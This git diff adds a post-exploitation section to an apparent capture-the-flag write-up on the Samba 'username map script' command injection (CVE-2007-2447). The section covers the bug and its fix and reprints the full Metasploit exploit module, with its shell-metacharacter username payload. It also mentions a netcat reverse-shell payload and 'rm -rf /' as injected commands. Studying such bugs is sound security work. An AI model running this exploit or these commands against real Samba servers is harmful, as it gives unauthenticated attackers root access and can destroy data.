@@ -366,7 +366,171 @@ cd /root
 cat root.txt
 <root flag value>
 ```
+## Post-Exploit
+The box is done, but let's not stop there. I'd like to follow up on this in three ways.
+1) Analyze the bug
+2) Analyze the metasploit module 
+3) Perform the exploit manually or via python
 
+### The Samba bug (CVE-2007-2447)
+In summary, the bug can be explained as a remote command injection vulnerability in Samba 3.0.0 through 3.0.25rc3 that allows unauthenticated attackers to execute arbitrary shell commands as root when certain external‐script options are enabled in `smb.conf`. 
+
+The summary is sufficient for understand that there was a pretty bad bug, but doesn't explain EXACTLY what happened. Let's go further. 
+
+#### What is the "username map script"?
+When Samba receives a Windows-style login or RPC call, it needs to convert the Windows account name (e.g. `CORP\Alice`) into a local Unix user ID. By default, Samba uses a built-in mapping logic. However, the `username map script` setting in `smb.conf` can be set to supply an external program or script to the mapping instead. 
+```bash
+[global]
+    username map script = /path/to/script/map.sh
+```
+When this option is enabled, on every authentication or password-change RPC, *before checking credentials*, Samba invokes the `username map script` and passes the client-supplied username as a command line argument. 
+
+#### The Bug and The Fix
+Looking back at the commit history on GitHub, the fix was applied in [commit f65214b](https://github.com/samba-team/samba/commit/f65214be68c1a59d9598bfb9f3b19e71cc3fa07b).
+
+The bug was in the `smbrun.c` file, in the `smbrun` function, on line 176.
+
+```c
+execl("/bin/sh","sh","-c",cmd,NULL);
+```
+
+Which was replaced with the sanitized code.
+
+```c
+const char *newcmd = sanitize ? escape_shell_string(cmd) : cmd;
+	if (!newcmd) {
+		exit(82);
+	}
+	execl("/bin/sh","sh","-c",newcmd,NULL);
+}
+```
+
+Without analyzing every bit of the affected code, we can make some safe assumptions. 
+
+First, the original `cmd` being passed to `sh` was likely a simple concatenation of the `username map script` file name, along with an unsanitized user submitted username. 
+
+Second, the new `newcmd` escapes any character that is not considered valid input for a username before continuing execution. 
+
+#### Exploitation
+In the original code, the `cmd` variable was most likely just a concatenated string using the script name and the supplied username. 
+
+```bash
+/bin/sh -c /path/to/username/map/script/map.sh username
+```
+Since the username is not sanitized, we can send a shell character to break out of the intended command execution, and begin execution of a new command. For example, we would send a username with a semicolon: `username; evil`. Anything could have been sent, from a reverse shell to simply `rm -rf /`. 
+
+### Metasploit Module
+We used a metasploit module which automatically selected a payload.
+```bash
+msf6 > use exploit/multi/samba/usermap_script
+[*] No payload configured, defaulting to cmd/unix/reverse_netcat
+```
+We have two things to analyze here. What is the `usermap_script` and the `reverse_netcat` doing exactly. We can assume the latter is setting up a reverse shell using netcat, but the former needs more investigation.
+
+Rapid7 [describes](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/) the module on their site as follows.
+
+> This module exploits a command execution vulnerability in Samba
+> versions 3.0.20 through 3.0.25rc3 when using the non-default
+> "username map script" configuration option. By specifying a username
+> containing shell meta characters, attackers can execute arbitrary
+> commands.
+> 
+> No authentication is needed to exploit this vulnerability since
+> this option is used to map usernames prior to authentication!
+
+They also link to the [source code](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/samba/usermap_script.rb)
+
+```ruby
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::SMB::Client
+
+  # For our customized version of session_setup_no_ntlmssp
+  CONST = Rex::Proto::SMB::Constants
+  CRYPT = Rex::Proto::SMB::Crypt
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Samba "username map script" Command Execution',
+        'Description' => %q{
+          This module exploits a command execution vulnerability in Samba
+          versions 3.0.20 through 3.0.25rc3 when using the non-default
+          "username map script" configuration option. By specifying a username
+          containing shell meta characters, attackers can execute arbitrary
+          commands.
+
+          No authentication is needed to exploit this vulnerability since
+          this option is used to map usernames prior to authentication!
+        },
+        'Author' => [ 'jduck' ],
+        'License' => MSF_LICENSE,
+        'References' => [
+          [ 'CVE', '2007-2447' ],
+          [ 'OSVDB', '34700' ],
+          [ 'BID', '23972' ],
+          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534' ],
+          [ 'URL', 'http://samba.org/samba/security/CVE-2007-2447.html' ]
+        ],
+        'Platform' => ['unix'],
+        'Arch' => ARCH_CMD,
+        'Privileged' => true, # root or nobody user
+        'Payload' => {
+          'Space' => 1024,
+          'DisableNops' => true,
+          'Compat' =>
+                        {
+                          'PayloadType' => 'cmd',
+                          # *_perl and *_ruby work if they are installed
+                          # mileage may vary from system to system..
+                        }
+        },
+        'Targets' => [
+          [ "Automatic", {} ]
+        ],
+        'DefaultTarget' => 0,
+        'DisclosureDate' => '2007-05-14',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
+
+    register_options(
+      [
+        Opt::RPORT(139)
+      ]
+    )
+
+    deregister_options('SMB::ProtocolVersion')
+  end
+
+  def exploit
+    vprint_status('Use Rex client (SMB1 only) since this module is not compatible with RubySMB client')
+    connect(versions: [1])
+
+    # lol?
+    username = "/=`nohup " + payload.encoded + "`"
+    begin
+      simple.client.negotiate(false)
+      simple.client.session_setup_no_ntlmssp(username, rand_text(16), datastore['SMBDomain'], false)
+    rescue ::Timeout::Error, XCEPT::LoginError
+      # nothing, it either worked or it didn't ;)
+    end
+
+    handler
+  end
+end
+```
 
 
 
